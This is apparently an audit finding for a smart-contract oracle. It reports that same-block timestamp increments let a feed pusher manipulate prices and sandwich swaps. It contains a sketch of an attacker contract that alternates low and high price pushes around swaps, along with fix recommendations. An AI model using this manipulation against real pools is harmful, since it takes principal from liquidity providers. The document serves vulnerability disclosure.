### Title
CompressedOracle fallback accepts multiple pusher-controlled timestamp updates per block, enabling same-block price arbitrage - (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

### Summary
The `CompressedOracleV1.fallback()` push path embeds the price timestamp inside the calldata word itself (pusher-controlled). The only freshness gate is strict monotonicity against the previously stored timestamp. Because `block.timestamp` is fixed within a block but the embedded millisecond timestamp can be any value up to `(block.timestamp + MAX_TIME_DRIFT) × 1000`, a creator or delegated pusher can push arbitrarily many distinct prices in the same block by incrementing the embedded timestamp by 1 ms per call. Combined with the fact that `CompressedOracle.price()` carries no `inSwap()` binding or registration check, a creator who is also a trader can sandwich their own swaps with hand-picked initial and final prices inside a single atomic transaction.

### Finding Description

`CompressedOracleV1.fallback()` processes one or more 32-byte slot words. For each word the timestamp is extracted from the calldata:

```
TimeMs timestampMs = toTimeMs(word >> 8 & X56);
timestampMs.revertIfAfterBlockTimeWithDrift(MAX_TIME_DRIFT);
...
bool newer = timestampMs.isAfter(oldTimestampMs);
if (!newer) continue;
_writeStorage(key, bytes32(bytes32(word & ~uint256(0xff))));
``` [1](#0-0) 

The two constraints are:
1. `timestampMs / 1000 ≤ block.timestamp + MAX_TIME_DRIFT` — not too far in the future.
2. `timestampMs > stored_timestampMs` — strictly newer than what is already stored.

Neither constraint ties the timestamp to `block.number` or `block.timestamp` in a way that prevents multiple updates within the same block. A pusher can call `fallback` with timestamp `T`, then again with `T + 1 ms`, then `T + 2 ms`, all within the same block, and each call will pass both checks and overwrite the stored price. [2](#0-1) 

The `CompressedOracle.price()` read path is explicitly open — the `pool` parameter is ignored, there is no `inSwap()` binding, no `registeredPool` check, and no blacklist gate:

```solidity
function price(bytes32 feedId, address /* pool */)
    external view
    returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
{
    return _price(feedId);
}
``` [3](#0-2) 

This contrasts with `OracleBase.price()`, which enforces `pool.inSwap() == msg.sender` and `registeredPool[feedId][pool]` before returning any data. [4](#0-3) 

The fallback push path is permissionless for any EOA (they push into their own namespace) and for any delegated pusher (via `allowPushers` / `allowContractPushers`):

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

### Impact Explanation

A creator or delegated pusher who is also a trader can execute the following atomic sequence inside a single transaction:

1. Call `oracle.fallback(word_A)` — push price `P_low` with timestamp `T`.
2. Call `pool.swap()` — buy the underpriced asset at `P_low`.
3. Call `oracle.fallback(word_B)` — push price `P_high` with timestamp `T + 1 ms` (same block, passes monotonicity).
4. Call `pool.swap()` — sell the asset at `P_high`.

The attacker captures the spread `P_high − P_low` at the expense of the pool's LPs. Because the CompressedOracle's `price()` has no abuse-protection layer, the pool reads the manipulated price without any attribution or blacklist check. This constitutes **bad-price execution** and **direct loss of LP principal**, both within the contest's allowed impact gate.

### Likelihood Explanation

The attack requires the adversary to control a CompressedOracle feed that a production pool is configured to use. The creator of a CompressedOracle namespace is a semi-trusted entity (trusted by the pool admin to supply accurate prices) but is not a privileged oracle admin. The `allowPushers` / `allowContractPushers` delegation paths further widen the set of actors who can push into a creator's namespace. During periods of high volatility the profit opportunity is largest, matching the external report's framing exactly.

### Recommendation

1. **Per-block update lock**: store the last update `block.number` alongside the slot timestamp and reject any push that arrives in the same block as the previous accepted update for that slot.
2. **Anchor timestamp to block time**: instead of trusting the pusher-supplied millisecond timestamp for monotonicity, derive the stored timestamp from `block.timestamp` (converted to ms) so that two calls in the same block always produce the same timestamp and the second is rejected by the `isAfter` check.
3. **Apply abuse-protection to CompressedOracle reads**: mirror the `inSwap()` + `registeredPool` gate from `OracleBase.price()` so that the open read path cannot be exploited even if price manipulation succeeds.

### Proof of Concept

```solidity
// Attacker contract (creator of the CompressedOracle feed used by the target pool)
contract Exploit {
    CompressedOracleV1 oracle;
    IPool pool;

    function attack() external {
        uint56 T = uint56(block.timestamp * 1000);

        // Step 1: push artificially LOW price (e.g. 50% of fair value)
        bytes32 wordLow = _buildWord(slotId, T,     lowPrice,  s0, s1);
        (bool ok,) = address(oracle).call(abi.encodePacked(wordLow));
        require(ok);

        // Step 2: swap — pool reads P_low from oracle, attacker buys cheap
        pool.swap(...);

        // Step 3: push artificially HIGH price (e.g. 150% of fair value)
        //         T+1 ms satisfies isAfter(T) and revertIfAfterBlockTimeWithDrift
        bytes32 wordHigh = _buildWord(slotId, T + 1, highPrice, s0, s1);
        (ok,) = address(oracle).call(abi.encodePacked(wordHigh));
        require(ok);

        // Step 4: swap — pool reads P_high, attacker sells dear
        pool.swap(...);
        // Net profit = (P_high - P_low) × amount, paid by LPs
    }
}
```

The `T + 1` embedded timestamp passes `revertIfAfterBlockTimeWithDrift` (it is still ≤ `block.timestamp + drift`) and passes `isAfter(T)` (it is strictly greater), so the second push is accepted and overwrites the stored price within the same block. [6](#0-5)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L163-169)
```text
    function price(bytes32 feedId, address /* pool */)
        external
        view
        returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
    {
        return _price(feedId);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L326-344)
```text
        for (uint256 ptr = 0; ptr < end; ptr += 32) {
            uint256 word;
            assembly ("memory-safe") {
                word := calldataload(ptr)
            }
            // casting to 'uint8' is safe we want LSB
            // forge-lint: disable-next-line(unsafe-typecast)
            uint8 slotId = uint8(word);
            TimeMs timestampMs = toTimeMs(word >> 8 & X56);
            timestampMs.revertIfAfterBlockTimeWithDrift(MAX_TIME_DRIFT);
            bytes32 key = bytes32(namespace | uint256(slotId));
            uint256 old = uint256(_loadStorage(key));
            TimeMs oldTimestampMs = toTimeMs(old >> 8 & X56);

            bool newer = timestampMs.isAfter(oldTimestampMs);
            if (!newer) continue;

            _writeStorage(key, bytes32(bytes32(word & ~uint256(0xff))));
        }
```

**File:** smart-contracts-poc/contracts/oracles/utils/TimeMs.sol (L24-30)
```text
function isAfter(TimeMs t0, TimeMs t1) pure returns (bool) {
    return TimeMs.unwrap(t0) > TimeMs.unwrap(t1);
}

function revertIfAfterBlockTimeWithDrift(TimeMs t0, uint256 drift) view {
    require(t0.toSeconds() <= block.timestamp + drift, FutureTimestamp());
}
```

**File:** smart-contracts-poc/contracts/oracles/providers/OracleBase.sol (L160-172)
```text
    function price(bytes32 feedId, address pool)
        external
        feedExists(feedId)
        notBlacklisted
        returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
    {
        require(pool != address(0) && IPool(pool).inSwap() == msg.sender, InvalidInSwap());
        require(!blacklisted[pool], Blacklisted(pool));
        require(registeredPool[feedId][pool], NotRegistered(feedId, pool));

        (mid, spread, spread1, refTime) = _readPrice(feedId);
        emit PriceRead(pool, feedId);
    }
```
